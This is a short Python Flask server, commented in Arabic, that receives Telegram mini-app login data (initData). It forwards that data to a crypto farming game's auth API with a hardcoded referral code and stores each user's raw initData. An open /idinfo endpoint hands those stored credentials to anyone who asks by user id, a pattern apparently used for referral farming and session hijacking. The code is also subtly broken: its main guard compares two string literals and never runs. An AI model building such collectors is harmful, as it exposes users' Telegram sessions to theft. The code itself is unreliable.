from flask import Flask, request, render_template, jsonify
import requests
import urllib.parse as ul
import json

app = Flask('__name__')

# تخزين مؤقت للبيانات
data_store = {}

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/id', methods=['POST'])
def receive_data():
    content = request.json
    init_data = content.get("initData")

    # تنفيذ الطلب الخارجي كما في JavaScript
    headers = {
        'Content-Type': 'application/json',
        'x-telegram-bot-api-secret-token': init_data
    }
    data = {
        "referral_code": "5343064159"
    }

    try:
        response = requests.post('https://fruitcryptofarm.xyz/api/auth/telegram', headers=headers, json=data)
        api_response = response.text
    except Exception as e:
        return f"خطأ أثناء الاتصال بـ API: {str(e)}", 500

    # استخراج user_id من initData إن أمكن
    user_id = "unknown"
    try:
        parsed = ul.parse_qs(init_data)
        user_data = parsed.get("user")
        if user_data:
            user_info = json.loads(user_data[0])
            user_id = str(user_info.get("id", "unknown"))
    except Exception as e:
        print("خطأ في التحليل:", e)

    # حفظ البيانات
    data_store[user_id] = {
        "init_data": init_data,
        "api_response": api_response
    }

    return f"تم الحفظ للمستخدم {user_id}"

@app.route('/idinfo')
def id_info():
    user_id = request.args.get("id")
    if user_id in data_store:
        return jsonify(data_store[user_id])
    return "لم يتم العثور على بيانات لهذا المستخدم.", 404

if '__name__'== '__main__':
    app.run(host="0.0.0.0", port=5000)
